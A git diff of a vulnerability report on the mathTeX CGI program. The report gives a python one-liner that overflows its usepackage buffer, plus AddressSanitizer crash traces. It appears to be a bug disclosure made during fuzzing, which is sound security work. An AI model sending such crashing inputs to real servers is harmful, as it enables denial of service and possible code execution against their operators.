@@ -5,67 +5,54 @@ In the latest mathtex, there is a stack overflow in function mathtex, leading to
 ## reproduce
 
 ``` bash
-python -c "print(b'\\usepackage{' + b'a'*2048 + b'}')" | xargs ./mathtex.cgi
+python -c "print((b'\\usepackage{' + b'a'*2048 + b'}')*9)" | xargs ./mathtex.cgi
 
-+-----------------------------------------------------------------------+
-|mathTeX vers 1.03, Copyright(c) 2007-2009, John Forkosh Associates, Inc|
-+-----------------------------------------------------------------------+
-| mathTeX is free software, licensed to you under terms of the GNU/GPL  |
-|           and comes with absolutely no warranty whatsoever.           |
-|     See http://www.forkosh.com/mathtex.html for complete details.     |
-+-----------------------------------------------------------------------+
-
-mathTeX> running image: ./mathtex.cgi
-
-mathTeX> input expression:
-         b\\usepackage{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}
 =================================================================
-==3232857==ERROR: AddressSanitizer: strcpy-param-overlap: memory ranges [0x7ffff5e1b323,0x7ffff5e1b353) and [0x7ffff5e1b32e, 0x7ffff5e1b35e) overlap
-    #0 0x7ffff78a1cfc in strcpy ../../../../src/libsanitizer/asan/asan_interceptors.cpp:561
-    #1 0x555555575511 in strchange (/home/yty/fuzzing/mathtex/mathtex.cgi+0x21511) (BuildId: d8e50f84c9ccddd3910a51c0dc87672486b6a83f)
-    #2 0x55555557542a in strreplace (/home/yty/fuzzing/mathtex/mathtex.cgi+0x2142a) (BuildId: d8e50f84c9ccddd3910a51c0dc87672486b6a83f)
-    #3 0x555555566a0e in mathtex (/home/yty/fuzzing/mathtex/mathtex.cgi+0x12a0e) (BuildId: d8e50f84c9ccddd3910a51c0dc87672486b6a83f)
-    #4 0x555555565a26 in main (/home/yty/fuzzing/mathtex/mathtex.cgi+0x11a26) (BuildId: d8e50f84c9ccddd3910a51c0dc87672486b6a83f)
-    #5 0x7ffff7642c89  (/lib/x86_64-linux-gnu/libc.so.6+0x27c89) (BuildId: 2e01923fea4ad9f7fa50fe24e0f3385a45a6cd1c)
-    #6 0x7ffff7642d44 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x27d44) (BuildId: 2e01923fea4ad9f7fa50fe24e0f3385a45a6cd1c)
-    #7 0x555555562520 in _start (/home/yty/fuzzing/mathtex/mathtex.cgi+0xe520) (BuildId: d8e50f84c9ccddd3910a51c0dc87672486b6a83f)
+==32795==ERROR: AddressSanitizer: global-buffer-overflow on address 0x557f887cc5a0 at pc 0x7f1d8fbb316d bp 0x7ffc18ed0ca0 sp 0x7ffc18ed0448
+WRITE of size 256 at 0x557f887cc5a0 thread T0
+    #0 0x7f1d8fbb316c in __interceptor_strcpy ../../../../src/libsanitizer/asan/asan_interceptors.cc:431
+    #1 0x557f8878a39f in getdirective /home/tianyang/fuzzing/mathtex/mathtex.c:3563
+    #2 0x557f88778c4f in main /home/tianyang/fuzzing/mathtex/mathtex.c:1319
+    #3 0x7f1d8f949082 in __libc_start_main ../csu/libc-start.c:308
+    #4 0x557f88775b2d in _start (/home/tianyang/fuzzing/mathtex/mathtex.cgi+0x10b2d)
 
-Address 0x7ffff5e1b323 is located in stack of thread T0 at offset 8995 in frame
-    #0 0x555555565c93 in mathtex (/home/yty/fuzzing/mathtex/mathtex.cgi+0x11c93) (BuildId: d8e50f84c9ccddd3910a51c0dc87672486b6a83f)
-
-  This frame has 11 object(s):
-    [32, 56) 'beginmath' (line 1216)
-    [96, 120) 'endmath' (line 1217)
-    [160, 416) 'latexfile' (line 1213)
-    [480, 736) 'giffile' (line 1213)
-    [800, 1824) 'errormsg' (line 1198)
-    [1952, 2976) 'usepackage' (line 1201)
-    [3104, 4128) 'convertargs' (line 1202)
-    [4256, 5280) 'dvipngargs' (line 1206)
-    [5408, 6432) 'subcommand' (line 1215)
-    [6560, 8608) 'command' (line 1215)
-    [8736, 57887) 'latexwrapper' (line 1170) <== Memory access at offset 8995 is inside this variable
-HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
-      (longjmp and C++ exceptions *are* supported)
-Address 0x7ffff5e1b32e is located in stack of thread T0 at offset 9006 in frame
-    #0 0x555555565c93 in mathtex (/home/yty/fuzzing/mathtex/mathtex.cgi+0x11c93) (BuildId: d8e50f84c9ccddd3910a51c0dc87672486b6a83f)
-
-  This frame has 11 object(s):
-    [32, 56) 'beginmath' (line 1216)
-    [96, 120) 'endmath' (line 1217)
-    [160, 416) 'latexfile' (line 1213)
-    [480, 736) 'giffile' (line 1213)
-    [800, 1824) 'errormsg' (line 1198)
-    [1952, 2976) 'usepackage' (line 1201)
-    [3104, 4128) 'convertargs' (line 1202)
-    [4256, 5280) 'dvipngargs' (line 1206)
-    [5408, 6432) 'subcommand' (line 1215)
-    [6560, 8608) 'command' (line 1215)
-    [8736, 57887) 'latexwrapper' (line 1170) <== Memory access at offset 9006 is inside this variable
-HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
-      (longjmp and C++ exceptions *are* supported)
-SUMMARY: AddressSanitizer: strcpy-param-overlap ../../../../src/libsanitizer/asan/asan_interceptors.cpp:561 in strcpy
-==3232857==ABORTING
+0x557f887cc5a0 is located 0 bytes to the right of global variable 'packages' defined in 'mathtex.c:428:13' (0x557f887cc120) of size 1152
+  'packages' is ascii string 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
+0x557f887cc5a0 is located 32 bytes to the left of global variable 'packargs' defined in 'mathtex.c:429:13' (0x557f887cc5c0) of size 1152
+SUMMARY: AddressSanitizer: global-buffer-overflow ../../../../src/libsanitizer/asan/asan_interceptors.cc:431 in __interceptor_strcpy
+Shadow bytes around the buggy address:
+  0x0ab0710f1860: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0ab0710f1870: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0ab0710f1880: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0ab0710f1890: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0ab0710f18a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0ab0710f18b0: 00 00 00 00[f9]f9 f9 f9 00 00 00 00 00 00 00 00
+  0x0ab0710f18c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0ab0710f18d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0ab0710f18e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0ab0710f18f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0ab0710f1900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+  Shadow gap:              cc
+==32795==ABORTING
 ```
 
 ## cause
@@ -73,6 +60,9 @@ SUMMARY: AddressSanitizer: strcpy-param-overlap ../../../../src/libsanitizer/asa
 Function `mathtex` handles `usepackage` in the LaTex string.
 
 ``` C
+// ...
+static	char packages[9][128];		/* additional package names */
+// ...
 // ...
 char  usepackage[1024] = "\000";	/* additional \usepackage{}'s */
 // ...
@@ -89,4 +79,4 @@ if ( !iserror )				/* don't \usepackage for error */
     strcat(usepackage,"}\n"); }		/* finish constructing directive */
 ```
 
-The size of `usepackage` is 1024. The `mathtex` function use `strcat` function to fill `usepackage` without checking the length of input, causing a stack overflow, leading to DoS and command execution.
+The size of `usepackage` is 1024. The `mathtex` function use `strcat` function to fill `usepackage` from array packages, which have a max length of 9*128=1152.
